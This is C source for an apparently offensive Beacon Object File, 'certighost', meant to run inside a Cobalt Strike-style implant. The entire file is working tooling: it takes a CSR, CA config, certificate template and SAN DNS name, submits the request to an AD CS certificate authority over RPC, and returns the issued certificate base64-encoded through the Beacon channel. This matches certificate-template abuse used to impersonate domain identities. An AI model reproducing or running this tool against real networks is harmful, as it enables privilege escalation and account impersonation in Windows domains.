#define CG_CORE_API static inline __attribute__((always_inline))
#define CG_CORE_LOCAL static inline __attribute__((always_inline))
#include "certighost_core.h"
#include "certighost_win.h"
#include "beacon.h"

/*
 * The BOF is built as one translation unit so the COFF loader only needs to
 * resolve Beacon APIs and DFR imports. The same core source is compiled alone
 * for the host-side harness.
 */
#include "certighost_core.c"

#define CG_BOF_LOCAL static inline __attribute__((always_inline))

CG_BOF_LOCAL int cg_bof_slice_equal(const cg_slice *left, const cg_slice *right) {
    cg_u32 i;

    if (left->len != right->len) {
        return 0;
    }
    for (i = 0u; i < left->len; ++i) {
        if (left->ptr[i] != right->ptr[i]) {
            return 0;
        }
    }
    return 1;
}

CG_BOF_LOCAL int cg_bof_extract_slice(datap *parser, cg_slice *out) {
    int raw_len = -1;
    char *raw = BeaconDataExtract(parser, &raw_len);

    if (raw_len < 0) {
        return 0;
    }
    if (raw == (char *)0 && raw_len != 0) {
        return 0;
    }
    out->ptr = (const cg_u8 *)raw;
    out->len = (cg_u32)raw_len;
    return 1;
}

CG_BOF_LOCAL int cg_bof_extract_validated_input(char *args, int alen, const cg_input *strict, cg_input *out) {
    datap parser;

    BeaconDataParse(&parser, args, alen);
    if (!cg_bof_extract_slice(&parser, &out->csr) ||
        !cg_bof_extract_slice(&parser, &out->ca_config) ||
        !cg_bof_extract_slice(&parser, &out->template_name) ||
        !cg_bof_extract_slice(&parser, &out->san_dns) ||
        !cg_bof_extract_slice(&parser, &out->cdc) ||
        !cg_bof_extract_slice(&parser, &out->rmd)) {
        return 0;
    }
    if (!cg_bof_slice_equal(&out->csr, &strict->csr) ||
        !cg_bof_slice_equal(&out->ca_config, &strict->ca_config) ||
        !cg_bof_slice_equal(&out->template_name, &strict->template_name) ||
        !cg_bof_slice_equal(&out->san_dns, &strict->san_dns) ||
        !cg_bof_slice_equal(&out->cdc, &strict->cdc) ||
        !cg_bof_slice_equal(&out->rmd, &strict->rmd)) {
        return 0;
    }
    return cg_validate_input(out) == CG_OK;
}

CG_BOF_LOCAL BSTR cg_bof_bstr_from_ascii(const cg_u8 *value, cg_u32 len) {
    BSTR out;
    cg_u32 i;

    out = OLEAUT32$SysAllocStringLen((const WCHAR *)0, (UINT)len);
    if (out == (BSTR)0) {
        return (BSTR)0;
    }
    for (i = 0u; i < len; ++i) {
        out[i] = (WCHAR)value[i];
    }
    return out;
}

CG_BOF_LOCAL void cg_bof_clear_bstr(BSTR value) {
    if (value != (BSTR)0) {
        UINT bytes = OLEAUT32$SysStringByteLen(value);
        cg_secure_zero((void *)value, (cg_u32)bytes);
        OLEAUT32$SysFreeString(value);
    }
}

CG_BOF_LOCAL void cg_bof_heap_free_sensitive(HANDLE heap, void *value, cg_u32 len) {
    if (heap != (HANDLE)0 && value != (void *)0) {
        cg_secure_zero(value, len);
        KERNEL32$HeapFree(heap, 0u, value);
    }
}

CG_BOF_LOCAL void cg_bof_report_hresult(const char *phase, HRESULT hr) {
    BeaconPrintf(CALLBACK_ERROR, "certighost: %s failed (HRESULT=0x%08x)", phase, (unsigned int)hr);
}

CG_BOF_LOCAL void cg_bof_emit_disposition_message(HANDLE heap, ICertRequest *request) {
    BSTR message = (BSTR)0;
    char *ascii = (char *)0;
    UINT chars;
    cg_u32 i;
    HRESULT hr;

    hr = request->lpVtbl->GetDispositionMessage(request, &message);
    if (CG_FAILED(hr) || message == (BSTR)0) {
        cg_bof_clear_bstr(message);
        return;
    }
    chars = OLEAUT32$SysStringLen(message);
    if (chars == 0u || chars > 1024u) {
        cg_bof_clear_bstr(message);
        return;
    }
    ascii = (char *)KERNEL32$HeapAlloc(heap, 0u, (SIZE_T)chars + 1u);
    if (ascii == (char *)0) {
        cg_bof_clear_bstr(message);
        return;
    }
    for (i = 0u; i < (cg_u32)chars; ++i) {
        WCHAR c = message[i];
        if (c == (WCHAR)'\r' || c == (WCHAR)'\n' || c == (WCHAR)'\t') {
            ascii[i] = ' ';
        } else if (c >= 0x20u && c <= 0x7eu) {
            ascii[i] = (char)c;
        } else {
            ascii[i] = '?';
        }
    }
    ascii[chars] = '\0';
    BeaconPrintf(CALLBACK_ERROR, "certighost: CA message: %s", ascii);
    cg_bof_heap_free_sensitive(heap, ascii, (cg_u32)chars + 1u);
    cg_bof_clear_bstr(message);
}

CG_BOF_LOCAL void cg_bof_report_request_state(HANDLE heap, ICertRequest *request, LONG disposition, LONG request_id) {
    LONG last_status = 0;
    HRESULT hr = request->lpVtbl->GetLastStatus(request, &last_status);

    if (CG_SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "certighost: request not issued (disposition=%ld request_id=%ld last_status=0x%08x)",
                     disposition, request_id, (unsigned int)last_status);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
                     "certighost: request not issued (disposition=%ld request_id=%ld)",
                     disposition, request_id);
    }
    cg_bof_emit_disposition_message(heap, request);
}

__attribute__((flatten)) void go(char *args, int alen) {
    GUID clsid_cert_request = {
        0x98aff3f0u, 0x5524u, 0x11d0u, {0x88u, 0x12u, 0x00u, 0xa0u, 0xc9u, 0x03u, 0xb8u, 0x3cu}
    };
    GUID iid_cert_request = {
        0x014e4840u, 0x5523u, 0x11d0u, {0x88u, 0x12u, 0x00u, 0xa0u, 0xc9u, 0x03u, 0xb8u, 0x3cu}
    };
    cg_input strict_input;
    cg_input input;
    cg_status status;
    char attributes[CG_MAX_ATTRIBUTES_LEN + 1u];
    cg_u32 attributes_len = 0u;
    HANDLE heap = (HANDLE)0;
    ICertRequest *request = (ICertRequest *)0;
    BSTR bstr_request = (BSTR)0;
    BSTR bstr_attributes = (BSTR)0;
    BSTR bstr_config = (BSTR)0;
    BSTR bstr_certificate = (BSTR)0;
    char *certificate_b64 = (char *)0;
    cg_u32 certificate_len = 0u;
    cg_u32 certificate_b64_cap = 0u;
    cg_u32 certificate_b64_len = 0u;
    LONG disposition = 0;
    LONG request_id = -1;
    HRESULT hr;
    int should_uninitialize = 0;

    if (args == (char *)0 || alen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: missing packed arguments");
        return;
    }
    status = cg_parse_packed_args((const cg_u8 *)args, (cg_u32)alen, &strict_input);
    if (status != CG_OK) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: argument validation failed: %s", cg_status_string(status));
        return;
    }
    if (!cg_bof_extract_validated_input(args, alen, &strict_input, &input)) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: Beacon parser disagreed with the validated packed argument layout");
        return;
    }
    status = cg_build_attributes(&input, attributes, (cg_u32)sizeof(attributes), &attributes_len);
    if (status != CG_OK) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: attribute construction failed: %s", cg_status_string(status));
        cg_secure_zero(attributes, (cg_u32)sizeof(attributes));
        return;
    }
    heap = KERNEL32$GetProcessHeap();
    if (heap == (HANDLE)0) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: GetProcessHeap failed");
        cg_secure_zero(attributes, (cg_u32)sizeof(attributes));
        return;
    }
    bstr_request = OLEAUT32$SysAllocStringByteLen((const char *)input.csr.ptr, (UINT)input.csr.len);
    bstr_attributes = cg_bof_bstr_from_ascii((const cg_u8 *)attributes, attributes_len);
    bstr_config = cg_bof_bstr_from_ascii(input.ca_config.ptr, input.ca_config.len);
    if (bstr_request == (BSTR)0 || bstr_attributes == (BSTR)0 || bstr_config == (BSTR)0) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: BSTR allocation failed");
        goto cleanup;
    }
    hr = OLE32$CoInitializeEx(CG_NULL, CG_COINIT_MULTITHREADED);
    if (hr == CG_S_OK || hr == CG_S_FALSE) {
        should_uninitialize = 1;
    } else if (hr != CG_RPC_E_CHANGED_MODE) {
        cg_bof_report_hresult("CoInitializeEx", hr);
        goto cleanup;
    }
    hr = OLE32$CoCreateInstance(&clsid_cert_request,
                                CG_NULL,
                                CG_CLSCTX_INPROC_SERVER,
                                &iid_cert_request,
                                (LPVOID *)&request);
    if (CG_FAILED(hr) || request == (ICertRequest *)0) {
        cg_bof_report_hresult("CoCreateInstance(CertRequest)", hr);
        goto cleanup;
    }
    hr = request->lpVtbl->Submit(request,
                                 CG_CR_IN_BINARY | CG_CR_IN_PKCS10 | CG_CR_IN_RPC,
                                 bstr_request,
                                 bstr_attributes,
                                 bstr_config,
                                 &disposition);
    if (CG_FAILED(request->lpVtbl->GetRequestId(request, &request_id))) {
        request_id = -1;
    }
    if (CG_FAILED(hr)) {
        cg_bof_report_hresult("ICertRequest::Submit", hr);
        cg_bof_report_request_state(heap, request, disposition, request_id);
        goto cleanup;
    }
    if (disposition != CG_CR_DISP_ISSUED) {
        cg_bof_report_request_state(heap, request, disposition, request_id);
        goto cleanup;
    }
    hr = request->lpVtbl->GetCertificate(request, CG_CR_OUT_BINARY, &bstr_certificate);
    if (CG_FAILED(hr) || bstr_certificate == (BSTR)0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "certighost: issued request certificate retrieval failed (disposition=%ld request_id=%ld)",
                     disposition, request_id);
        cg_bof_report_hresult("ICertRequest::GetCertificate", hr);
        goto cleanup;
    }
    certificate_len = (cg_u32)OLEAUT32$SysStringByteLen(bstr_certificate);
    if (certificate_len == 0u || certificate_len > CG_MAX_CERT_LEN) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: issued certificate length is invalid (%u bytes)", certificate_len);
        goto cleanup;
    }
    certificate_b64_cap = cg_base64_encoded_size(certificate_len);
    if (certificate_b64_cap == 0u) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: issued certificate is too large to encode");
        goto cleanup;
    }
    certificate_b64_cap += 1u;
    certificate_b64 = (char *)KERNEL32$HeapAlloc(heap, 0u, (SIZE_T)certificate_b64_cap);
    if (certificate_b64 == (char *)0) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: certificate output allocation failed");
        goto cleanup;
    }
    status = cg_base64_encode((const cg_u8 *)bstr_certificate,
                              certificate_len,
                              certificate_b64,
                              certificate_b64_cap,
                              &certificate_b64_len);
    if (status != CG_OK) {
        BeaconPrintf(CALLBACK_ERROR, "certighost: certificate encoding failed: %s", cg_status_string(status));
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
                 "CERTIGHOST_RESULT disposition=%ld request_id=%ld cert_encoding=base64 cert_der_bytes=%u cert_base64_chars=%u",
                 disposition, request_id, certificate_len, certificate_b64_len);
    BeaconOutput(CALLBACK_OUTPUT, "CERTIGHOST_CERT_BEGIN\n", 22);
    BeaconOutput(CALLBACK_OUTPUT, certificate_b64, (int)certificate_b64_len);
    BeaconOutput(CALLBACK_OUTPUT, "\nCERTIGHOST_CERT_END\n", 21);

cleanup:
    cg_bof_heap_free_sensitive(heap, certificate_b64, certificate_b64_cap);
    cg_bof_clear_bstr(bstr_certificate);
    cg_bof_clear_bstr(bstr_request);
    cg_bof_clear_bstr(bstr_attributes);
    cg_bof_clear_bstr(bstr_config);
    if (request != (ICertRequest *)0) {
        request->lpVtbl->Release(request);
    }
    if (should_uninitialize) {
        OLE32$CoUninitialize();
    }
    cg_secure_zero(attributes, (cg_u32)sizeof(attributes));
}
